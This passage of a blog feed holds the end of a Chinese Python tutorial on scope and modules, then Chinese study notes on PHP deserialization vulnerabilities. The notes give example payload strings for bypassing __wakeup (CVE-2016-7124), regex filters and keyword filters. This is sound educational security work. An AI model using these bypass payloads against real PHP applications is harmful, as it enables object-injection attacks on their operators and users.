class="string">&quot;函数内 : &quot;</span>, total</span><br><span class="line">   <span class="keyword">return</span> total</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用sum函数</span></span><br><span class="line">total = <span class="built_in">sum</span>( <span class="number">10</span>, <span class="number">20</span> )</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数内 :  <span class="number">30</span></span><br></pre></td></tr></table></figure><h4 id="全局变量和局部变量"><a href="#全局变量和局部变量" class="headerlink" title="全局变量和局部变量"></a>全局变量和局部变量</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line">total = <span class="number">0</span> <span class="comment"># 这是一个全局变量</span></span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sum</span>(<span class="params"> arg1, arg2 </span>):</span><br><span class="line">   <span class="comment">#返回2个参数的和.&quot;</span></span><br><span class="line">   total = arg1 + arg2 <span class="comment"># total在这里是局部变量.</span></span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;函数内是局部变量 : &quot;</span>, total</span><br><span class="line">   <span class="keyword">return</span> total</span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用sum函数</span></span><br><span class="line"><span class="built_in">sum</span>( <span class="number">10</span>, <span class="number">20</span> )</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;函数外是全局变量 : &quot;</span>, total</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">函数内是局部变量 :  30</span><br><span class="line">函数外是全局变量 :  0</span><br></pre></td></tr></table></figure><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>模块(Module)是一个 Python 文件，以 .py 结尾，包含了 Python 对象定义和Python语句，让你能够有逻辑地组织你的 Python 代码段。把相关的代码分配到一个模块里能让你的代码更好用，更易懂。</p><p>模块能定义函数，类和变量，模块里也能包含可执行的代码。</p><p><strong>support.py 模块：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_func</span>(<span class="params"> par </span>):</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Hello : &quot;</span>, par</span><br><span class="line">   <span class="keyword">return</span></span><br></pre></td></tr></table></figure><h4 id="import-语句"><a href="#import-语句" class="headerlink" title="import 语句"></a>import 语句</h4><h5 id="模块引入"><a href="#模块引入" class="headerlink" title="模块引入"></a>模块引入</h5><p><code>import module1[, module2[,... moduleN]]</code></p><p>要引用模块 math，就可以在文件最开始的地方用 <strong>import math</strong> 来引入。在调用 math 模块中的函数时，必须这样引用：</p><p><code>模块名.函数名</code></p><p>当解释器遇到 import 语句，如果模块在当前的搜索路径就会被导入。一个模块只会被导入一次，不管你执行了多少次import。</p><p>搜索路径是一个解释器会先进行搜索的所有目录的列表。如想要导入模块 support.py，需要把命令放在脚本的顶端：</p><p><strong>test.py 文件代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> support</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 现在可以调用模块里包含的函数了</span></span><br><span class="line">support.print_func(<span class="string">&quot;Python&quot;</span>)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello : Python</span><br></pre></td></tr></table></figure><h4 id="from…import-语句"><a href="#from…import-语句" class="headerlink" title="from…import 语句"></a>from…import 语句</h4><p> from 语句让你从模块中导入一个指定的部分到当前命名空间中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> modname <span class="keyword">import</span> name1[, name2[, ... nameN]]</span><br></pre></td></tr></table></figure><p>导入模块 fib 的 fibonacci 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fib <span class="keyword">import</span> fibonacci</span><br></pre></td></tr></table></figure><p>这个声明不会把整个 fib 模块导入到当前的命名空间中，它只会将 fib 里的 fibonacci 单个引入到执行这个声明的模块的全局符号表。</p><h4 id="from…import-语句-1"><a href="#from…import-语句-1" class="headerlink" title="from…import* 语句"></a>from…import* 语句</h4><p>把一个模块的所有内容全都导入到当前的命名空间的声明</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> modname <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><p>一次性引入 math 模块中所有的东西</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><h4 id="搜索路径"><a href="#搜索路径" class="headerlink" title="搜索路径"></a>搜索路径</h4><p>当你导入一个模块，Python 解析器对模块位置的搜索顺序是：</p><ul><li>1、当前目录</li><li>2、如果不在当前目录，Python 则搜索在 shell 变量 PYTHONPATH 下的每个目录。</li><li>3、如果都找不到，Python会察看默认路径。UNIX下，默认路径一般为&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python&#x2F;。</li></ul><p>模块搜索路径存储在 system 模块的 sys.path 变量中。变量里包含当前目录，PYTHONPATH和由安装过程决定的默认目录。</p><h4 id="PYTHONPATH-变量"><a href="#PYTHONPATH-变量" class="headerlink" title="PYTHONPATH 变量"></a>PYTHONPATH 变量</h4><p>作为环境变量，PYTHONPATH 由装在一个列表里的许多目录组成。PYTHONPATH 的语法和 shell 变量 PATH 的一样。在 Windows 系统，典型的 PYTHONPATH 如</p><p><code>set PYTHONPATH=c:\python27\lib;</code></p><h4 id="命名空间和作用域"><a href="#命名空间和作用域" class="headerlink" title="命名空间和作用域"></a>命名空间和作用域</h4><p>命名空间是一个包含了变量名称们（键）和它们各自相应的对象们（值）的字典。表达式可以访问局部命名空间和全局命名空间里的变量。每个函数都有自己的命名空间。类的方法的作用域规则和通常函数的一样。</p><p>Python 假设任何在函数内赋值的变量都是局部的。因此如果要给函数内的全局变量赋值，必须使用 global 语句。</p><h4 id="globals-和-locals-函数"><a href="#globals-和-locals-函数" class="headerlink" title="globals() 和 locals() 函数"></a>globals() 和 locals() 函数</h4><p>根据调用地方的不同，globals() 和 locals() 函数可被用来返回全局和局部命名空间里的名字。如果在函数内部调用 locals()，返回的是所有能在该函数里访问的命名。</p><p>如果在函数内部调用 globals()，返回的是所有在该函数里能访问的全局名字。两个函数的返回类型都是字典，所以名字们能用 keys() 函数摘取。</p><h4 id="reload-函数"><a href="#reload-函数" class="headerlink" title="reload() 函数"></a>reload() 函数</h4><p>当一个模块被导入到一个脚本，模块顶层部分的代码只会被执行一次。如果要重新执行模块里顶层部分的代码，可以用 reload() 函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload(module_name)</span><br></pre></td></tr></table></figure><h4 id="包"><a href="#包" class="headerlink" title="包"></a>包</h4><p>包是一个分层次的文件目录结构，它定义了一个由模块及子包，和子包下的子包等组成的 Python 的应用环境。简单来说，包就是文件夹，但该文件夹下必须存在 <strong>init</strong>.py 文件, 该文件的内容可以为空。<strong>init</strong>.py 用于标识当前文件夹是一个包。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化学习笔记</title>
      <link href="/2024/03/10/2024-03-10-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/10/2024-03-10-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>php程序为了保存和转储对象，提供了序列化的方法。php序列化是为了在程序运行的过程中对对象进行转储而产生的。<strong>序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法。</strong></p><p>php序列化的函数为<code>serialize</code>，可以将对象中的成员变量转换成字符串。</p><p>反序列化的函数为<code>unserilize</code>，可以将<code>serialize</code>生成的字符串重新还原为对象中的成员变量。</p><p><strong>将用户可控的数据进行了反序列化</strong>，就是PHP反序列化漏洞。</p><p><strong>序列化</strong>的目的是方便数据的传输和存储。</p><p>在PHP应用中，序列化和反序列化一般用作缓存，比如session缓存，cookie等。通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h4 id="序列化的字母标识"><a href="#序列化的字母标识" class="headerlink" title="序列化的字母标识"></a>序列化的字母标识</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - boolean</span><br><span class="line">d - double</span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br><span class="line">N - NULL</span><br></pre></td></tr></table></figure><h4 id="序列化后的字符串格式"><a href="#序列化后的字符串格式" class="headerlink" title="序列化后的字符串格式"></a>序列化后的字符串格式</h4><p>每一个序列化后的小段都由<code>;</code> 隔开, 使用<code>&#123;&#125;</code>表示层级关系</p><table><thead><tr><th>数据类型</th><th>提示符</th><th>格式</th></tr></thead><tbody><tr><td>字符串</td><td><code>s</code></td><td>s:长度:”内容”</td></tr><tr><td>已转义字符串</td><td><code>S</code></td><td>s:长度:”转义后的内容”</td></tr><tr><td>整数</td><td><code>i</code></td><td>i:数值</td></tr><tr><td>布尔值</td><td><code>b</code></td><td><code>b:1</code> &#x3D;&gt; <code>true</code> &#x2F; <code>b:0</code> &#x3D;&gt; <code>false</code></td></tr><tr><td>空值</td><td><code>N</code></td><td>N;</td></tr><tr><td>数组</td><td><code>a</code></td><td>a:大小:{键序列段;值序列段;&lt;重复多次&gt;}</td></tr><tr><td>对象</td><td><code>O</code></td><td>O:类型名长度:”类型名称”:成员数:{成员名称序列段;成员值序列段:}</td></tr><tr><td>引用</td><td><code>R</code></td><td>R:反序列化变量的序号, 从1开始</td></tr></tbody></table><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>魔术方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。</p><h3 id="常用魔术方法"><a href="#常用魔术方法" class="headerlink" title="常用魔术方法"></a>常用魔术方法</h3><h6 id="construct"><a href="#construct" class="headerlink" title="__construct"></a><code>__construct</code></h6><p>构造函数, 在对应对象实例化时自动被调用. 子类中的构造函数不会隐式调用父类的构造函数.</p><p>在 PHP 8 以前, 与类名同名的方法可以作为 <code>__constuct</code> 调用但 <code>__construct</code> 方法优先</p><h6 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a><code>__sleep()</code></h6><p>此方法在对象被序列化时会调用。</p><p>如果方法存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p><h6 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a><code>__wakeup</code></h6><p>与<code>__sleep()</code>相反地，此方法在对象被反序列化时会调用</p><h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a><code>__toString</code></h6><p>此方法在对象转化成字符串时会被调用。</p><p>当然, 因为 PHP 是一个弱类型语言, 很多情况对象会被隐式转换成字符串, 比如</p><ul><li><code>==</code> 与字符串比较时会被隐式转换</li><li>字符串操作 (str系列函数), 字符串拼接, <code>addslashes</code></li><li>一些参数需要为字符串的参数: <code>class_exists</code> , <code>in_array</code>(第一个参数), SQL 预编译语句, <code>md5</code>, <code>sha1</code>等</li><li><code>print</code>, <code>echo</code> 函数</li></ul><p><u>简单示例</u></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 声明一个简单的类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$foo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$foo</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;foo = <span class="variable">$foo</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;foo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上示例会输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__get</span>()<span class="comment">//在读取某些不可访问或者不存在的字段时触发, 传入参数为字段名称</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>()<span class="comment">//给不可访问和不存在的字段赋值时触发, 传入的参数第一个为字段名, 第二个为赋值</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()<span class="comment">//把对象当做函数调用时会使用, 例如 $foo()</span></span><br><span class="line">    <span class="comment">//不仅限于显式调用, 将其作为回调函数(例如array_map作为第一个参数传入) 也会调用此函数</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()<span class="comment">//在对不可访问的字段调用 isset 或者 empty 时触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()<span class="comment">//在对不可访问的字段调用 unset  时触发</span></span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()<span class="comment">//在使用 var_dump, print_r 时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>()<span class="comment">// 在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>()<span class="comment">// 在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__set_state</span>()<span class="comment">// 调用var_export()导出类时，此静态方法会被调用</span></span><br><span class="line"><span class="title function_ invoke__">__clone</span>()<span class="comment">// 当对象复制完成时调用</span></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()<span class="comment">// 尝试加载未定义的类</span></span><br></pre></td></tr></table></figure><h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>不同的情况下会有不同的顺序。</p><ol><li>一个对象在其生命周期中一定会走过 <code>destruct</code>, 只有当对象没有被任何变量指向时才会被回收。</li></ol><p>​2.当使用 <code>new</code> 关键字来创建一个对象时会调用 <code>construct</code></p><p><strong>对于序列化&#x2F;反序列化时的情况</strong></p><p>序列化时会先调用 <code>sleep</code> 再调用 <code>destruct</code>, 故而完整的调用顺序为: <code>sleep</code> -&gt; <code>(变量存在)</code> -&gt; <code>destruct</code></p><p>反序列化时如果有 <code>__wakeup</code> 则会调用 <code>__wakeUp</code> 而不是 <code>__construct</code>, 故而逻辑为 <code>__wakeUp/__construct</code> -&gt; (变量存在)</p><h2 id="反序列化绕过"><a href="#反序列化绕过" class="headerlink" title="反序列化绕过"></a>反序列化绕过</h2><h4 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h4><p><code>(CVE-2016-7124)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP5 &lt; 5.6.25</span><br><span class="line"></span><br><span class="line">PHP7 &lt; 7.0.10</span><br></pre></td></tr></table></figure><p>利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行</p><p>对于下面这样一个自定义类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &#x27;abc&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        $this-&gt;a=&#x27;666&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function  __destruct()&#123;</span><br><span class="line">        echo $this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果执行<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code></p><p>输出结果为<code>666</code></p><p>而把对象属性个数的值增大执行<code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code></p><p>输出结果为<code>abc</code></p><h4 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="绕过部分正则"></a>绕过部分正则</h4><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头</p><p>有些时候我们会看到<code>^O:\d+</code> 这种的正则表达式, 要求开头不能为对象反序列化</p><p>这种情况我们有以下绕过手段</p><ol><li>由于<code>\d</code>只判断了是否为数字, 则可以在个数前<strong>添加<code>+</code>号</strong>来绕过正则表达式</li><li>将这个对象嵌套在其他类型的反序列化之中, 例如数组</li></ol><h5 id="利用加号绕过"><a href="#利用加号绕过" class="headerlink" title="利用加号绕过"></a>利用加号绕过</h5><p>（注意在url里传参时+要编码为%2B）</p><p><code>serialize(array(a)) ;</code> &#x2F;&#x2F;a为要反序列化的对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &#x27;abc&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function  __destruct()&#123;</span><br><span class="line">        echo $this-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function match($data)&#123;</span><br><span class="line">    if (preg_match(&#x27;/^O:\d+/&#x27;,$data))&#123;</span><br><span class="line">        die(&#x27;you lose!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = &#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;;</span><br><span class="line">// +号绕过</span><br><span class="line">$b = str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;, $a);</span><br><span class="line">unserialize(match($b));</span><br><span class="line">// serialize(array($a));</span><br><span class="line">unserialize(&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="利用引用"><a href="#利用引用" class="headerlink" title="利用引用"></a>利用引用</h4><pre><code>&lt;?phpclass test&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a = &#39;abc&#39;;        $this-&gt;b= &amp;$this-&gt;a;    &#125;    public function  __destruct()&#123;    if($this-&gt;a===$this-&gt;b)&#123;        echo 666;    &#125;  &#125;&#125;$a = serialize(new test());</code></pre><p>这个例子将$b设置为$a的引用，可以使$a永远与$b相等（相当于指针）</p><h4 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:4:&quot;test&quot;:2:&#123;S:4:&quot;\00*\00\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成16进制解析。</span><br></pre></td></tr></table></figure><p>我们可以使用十六进制搭配上已转义字符串来绕过对某些字符的检测，例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name == <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You did it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You can&#x27;t do it!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里检测了是否包含 <code>flag</code> 字符, 可以尝试使用 <code>flag</code> 的十六进制 <code>\66\6c\61\67</code> 来绕过, 构造以下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;O:<span class="number">4</span>:<span class="string">&quot;Read&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;&#125;&#x27;</span><br></pre></td></tr></table></figure><p> Python 脚本可以将字符串转换为 Hex</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>(<span class="string">&#x27;Enter a string: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\\&#x27;</span> + <span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>(<span class="string">&#x27;\\&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h4><h5 id="情况1：过滤后字符变多"><a href="#情况1：过滤后字符变多" class="headerlink" title="情况1：过滤后字符变多"></a>情况1：过滤后字符变多</h5><p>本地的php代码，把反序列化后的一个x替换成为两个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span 